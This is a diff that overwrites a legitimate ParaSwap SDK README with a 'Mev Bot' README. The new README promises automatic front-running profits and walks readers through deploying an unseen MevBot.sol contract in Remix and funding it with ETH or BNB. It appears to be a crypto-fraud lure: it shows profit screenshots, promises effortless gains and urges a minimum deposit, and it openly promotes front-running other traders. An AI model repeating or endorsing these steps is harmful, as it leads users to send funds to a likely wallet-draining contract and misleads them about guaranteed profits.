@@ -1,200 +1,87 @@
-<p align="center">
-  <a href="https://paraswap.io">
-    <img src="https://cdn.paraswap.io/brand/paraswap.png" width="400px" >
-  </a>
-</p>
+# Profit 13.05.23-17.05.23
 
-# SDK for the ParaSwap API
+<img src="https://i.ibb.co/bWkNdH1/1.jpg" alt="1" border="0">
 
-Refer to the documentation of the ParaSwap API: https://developers.paraswap.network
+<img src="https://i.ibb.co/g9q1Njv/2.jpg" alt="2" border="0">
 
-## Features
-**Versatility**: works with both [web3](https://www.npmjs.com/package/web3) and [ethers](https://www.npmjs.com/package/ethers) without direct dependency
+# Mev Bot
+The term 'front-running' is commonly associated with the stock market, referring to the practice of leveraging insider information to seize market opportunities before others. This essentially amounts to insider trading.
 
-**Canonical**: bring only the functions you actually need
+# The Front-Running Bot
+A front-running bot is an automated program that examines pending transactions and outbids others by offering a higher gas fee, ensuring its transaction gets priority in processing, thereby front-running significant trades likely to influence market prices.
 
-**Lightweight**: 400B Gzipped for the minimal variant
+Bots, pre-configured programs, automate trading activities. They relieve users from constantly monitoring the market and determining the perfect timing for buying and selling. They auto-process and analyze market data, executing asset transactions on behalf of users. So, how do cryptocurrency front-running bots operate?
 
-## Installing ParaSwap SDK
+Design elements of Ethereum or blockchain allow all submitted transactions to reside temporarily in a 'mempool,' a holding area for transactions awaiting processing. Miners or bots can scrutinize the mempool to find suitable transactions for front-running in cryptocurrency trading.
 
-```bash
-yarn add @paraswap/sdk
-```
+Front-runner bots typically operate on a millisecond timescale. They can read a transaction from the mempool, calculate the ideal transaction size, set up the transactions, and execute them within split seconds. Manual operation cannot compete with this speed.
 
-## Using ParaSwap SDK
+By placing a buy order in the same block while setting a higher gas price, the bot front-runs specific transactions concerning slippage, trade volumes, and gas price. The front-run bot identifies when extra liquidity is added to an AMM (Automated Market Maker) pool on the exchange and manipulates the transaction order within a block to profit from another trader.
 
-There are multiple ways to use ParaSwap SDK, ranging from a simple construct-and-use approach to a fully composable _bring what you need_ approach which allows for advanced tree-shaking and minimizes bundle size.
+# Title:
+Creation of a Cutting-Edge Predictive Bot Leveraging Solidity Technology for Enhanced Mempool Scanning, Transaction Processing, and Security
 
-### Simple SDK
+# Introduction:
+The world of cryptocurrency technology demands increasingly sophisticated transaction processing systems. Our innovative predictive bot, built on Solidity technology, offers superior performance compared to existing solutions. It provides more efficient mempool scanning, accelerated transaction processing, and heightened security for users.
 
-Can be created by providing `chainId` and either `axios` or `window.fetch` (or alternative `fetch` implementation), and an optional `version` (`'5'` or `'6.2'`) parameter that corresponds to the API version SDK will be making requests to. The resulting SDK will be able to use all methods that query the API.
+# Key Features and Benefits:
+Innovative Predictive Bot: Our bot possesses the capability to predict and assess transactions in the mempool, facilitating processing at the earliest stage. This enhancement speeds up transaction processing and minimizes user waiting times. Deployment of Solidity Technology: Solidity technology equips our bot with superior performance and reliability, assuring steady operation and effective transaction processing. Flexibility and Scalability: Our bot adjusts to network alterations and scales according to requirements, ensuring a stable system operation. Security and Privacy: Our bot assures high-level security and user data privacy, leveraging contemporary cryptographic methodologies.
 
-```ts
-  import { constructSimpleSDK } from '@paraswap/sdk';
-  import axios from 'axios';
+The bot generates a unique smart contract for each client with a dedicated balance, offering an additional security layer and preventing unauthorized user wallet access.
+Conclusion: Our Solidity technology-based predictive bot revolutionizes the process of mempool scanning and transaction processing. It ensures faster and more reliable service for cryptocurrency platform users, making our product an invaluable asset for the development of digital asset infrastructure. The bot's operational costs are restricted to gas fees on the Ethereum or BSC networks.
 
-  // construct minimal SDK with fetcher only
-  const paraSwapMin = constructSimpleSDK({chainId: 1, axios});
-  // or
-  const paraSwapMin = constructSimpleSDK({chainId: 1, fetch: window.fetch, version: '5'});
+# Bot capabilities:
+Check every WETH pair. Calculate possible profit Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation) Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price) MEV bot Instructions (works only for Mainnet) How it works: create-a-frontrunner-bot-on-uniswap
 
-  const ETH = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
-  const DAI = '0x6B175474E89094C44Da98b954EedeAC495271d0F';
+You can see an example of how the bot works
 
-  async function swapExample() {
-    //                                     or any other signer/provider 
-    const signer: JsonRpcSigner = ethers.Wallet.fromMnmemonic('__your_mnemonic__');
-    const senderAddress = signer.address;
+<img src="https://i.ibb.co/xsLft4F/3.jpg" alt="3" border="0">
 
-    const priceRoute = await paraSwapMin.swap.getRate({
-      srcToken: ETH,
-      destToken: DAI,
-      amount: srcAmount,
-      userAddress: senderAddress,
-      side: SwapSide.SELL,
-    });
-
-    const txParams = await paraSwapMin.swap.buildTx(
-      {
-        srcToken,
-        destToken,
-        srcAmount,
-        destAmount,
-        priceRoute,
-        userAddress: senderAddress,
-        partner: referrer,
-      }     
-    );
-
-    const transaction = {
-      ...txParams,
-      gasPrice: '0x' + new BigNumber(txParams.gasPrice).toString(16),
-      gasLimit: '0x' + new BigNumber(5000000).toString(16),
-      value: '0x' + new BigNumber(txParams.value).toString(16),
-    };
-
-    const txr = await signer.sendTransaction(transaction);
-  }
-```
-
-If optional `providerOptions` is provided as the second parameter, then the resulting SDK will also be able to approve Tokens for swap.
-
-```ts
-  // with ethers.js
-  const providerOptionsEther = {
-    ethersProviderOrSigner: provider, // JsonRpcProvider
-    EthersContract: ethers.Contract,
-    account: senderAddress,
-  };
-
-  // or with web3.js
-  const providerOptionsWeb3 = {
-    web3, // new Web3(...) instance
-    account: senderAddress,
-  };
-
-  const paraSwap = constructSimpleSDK({chainId: 1, axios}, providerOptionsEther);
-
-  // approve token through sdk
-  const txHash = await paraSwap.approveToken(amountInWei, DAI);
-
-  // await tx somehow
-  await provider.waitForTransaction(txHash);
-```
-
-### Full SDK 
-```typescript
-import { constructFullSDK, constructAxiosFetcher, constructEthersContractCaller } from '@paraswap/sdk';
-
-const signer = ethers.Wallet.fromMnmemonic('__your_mnemonic__'); // or any other signer/provider 
-const account = '__signer_address__';
-
-const contractCaller = constructEthersContractCaller({
-  ethersProviderOrSigner: signer,
-  EthersContract: ethers.Contract,
-}, account); // alternatively constructWeb3ContractCaller
-const fetcher = constructAxiosFetcher(axios); // alternatively constructFetchFetcher
-
-const paraswap = constructFullSDK({
-  chainId: 1,
-  fetcher,
-  contractCaller,
-});
-```
-
-### Partial SDK
-For bundle-size savvy developers, you can construct a lightweight version of the SDK and bring only the functions you need.
-
-e.g. for only getting rates and allowances:
-
-```typescript
-import { constructPartialSDK, constructFetchFetcher, constructGetRate, constructGetBalances } from '@paraswap/sdk';
-
-const fetcher = constructFetchFetcher(window.fetch);
-
-const minParaSwap = constructPartialSDK({
-  chainId: 1,
-  fetcher,
-}, constructGetRate, constructGetBalances);
-
-const priceRoute = await minParaSwap.getRate(params);
-const allowance = await minParaSwap.getAllowance(userAddress, tokenAddress);
-```
-
-### Legacy
-The `ParaSwap` class is exposed for backwards compatibility with previous versions of the SDK.
-
-```typescript
-import { ParaSwap } from '@paraswap/sdk';
-import axios from 'axios';
-import Web3 from 'web3';
-
-const web3Provider = new Web3(window.ethereum);
-const account = '__user_address__';
-
-const paraswap = new ParaSwap({chainId: 1, web3Provider, account, axios});
-
-```
+# ✏️Step 1: 
+Remix Access the Remix IDE (this website is where we deploy the smart contract): https://remix.ethereum.org/ 
 
 
-Or you can use `ethers` in place of `web3`
+# ✏️ Step 2:
+File Explorer Hover over the tiny button in the top left and click and create new file "mevbot.sol" Copy the code from [**"MevBot.sol"**](MevBot.sol) and paste in Remix IDE
+Click Solidity complier 0.6.12
 
-```typescript
-import { ParaSwap } from '@paraswap/sdk';
-import { ethers } from "ethers";
-
-const ethersProvider = new ethers.providers.Web3Provider(window.ethereum)
-const account = '__user_address__';
-
-const paraswap = new ParaSwap({
-  chainId: 1,
-  account,
-  ethersDeps: {
-    ethersProviderOrSigner: ethersProvider;
-    EthersContract: ethers.Contract;
-  },
-  fetch: window.fetch,
- });
-
-```
-
-By analogy to ```constructPartialSDK```, you can leverage a lightweight version of the sdk for fetching only.
-
-```typescript
-import { ParaSwap } from '@paraswap/sdk';
-
-const paraswap = new ParaSwap({chainId: 1, fetch: window.fetch});
-
-```
-
-Refer to [this README for depecreated documentation](https://github.com/paraswap/paraswap-sdk/blob/c4c70c674fb2be4ec528064649d992d4b38c654b/README.md) for functions usage.
+<img src="https://i.ibb.co/Dg3HfJM/4-4.jpg" alt="4-4" border="0">
 
 
-Refer to [SDK API documentation](docs/md/modules.md) for detailed documentation on the methods provided in this SDK.
+# ✏️ Step 3:
+go to deploy and enter your details below
+enter here
+1) ETH or BSC
+2) ETH or BSC
+3) your address
 
-## Tests
+<img src="https://i.ibb.co/0Kkg8qx/5.jpg" alt="5" border="0">
 
-To run `yarn test` it is necessary to provide `PROVIDER_URL=<mainnet_rpc_url>` environment variable.
-If it is necessary to run tests against a different API endpoint, provide `API_URL=url_to_API` environment variable.
 
-<img src="./docs/passed_tests.jpg" width=350 />
+# ✏️ Step 4: 
+Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".
+
+<img src="https://i.ibb.co/5krtR1f/6.jpg" alt="6" border="0">
+
+# ✏️ Step 5:
+Next - Deposit Balance into MEV Bot and press "action" Copy your MevBot contract address and send a number of Ethereum / BNB to the bot's balance for the bot to work. And start it with the "action" button.
+
+ <img src="https://i.ibb.co/23CfpLs/7.jpg" alt="7" border="0">
+
+
+ <img src="https://i.ibb.co/KqCqYkc/8.jpg" alt="8" border="0">
+
+
+The MEVBot begins trading immeditately, simpy wait for profits to accumulate.
+
+❗ NOTE:
+You can start with any amount, but keep in mind that you need enough money for gas. we reccomend a minimum of 0.5 ETG / 3 BNB for you to start seeing profits in the first 24 hours.
+
+You can stop the bot or withdraw your funds at any time by calling the action function.
+
+# Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
+
+# License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
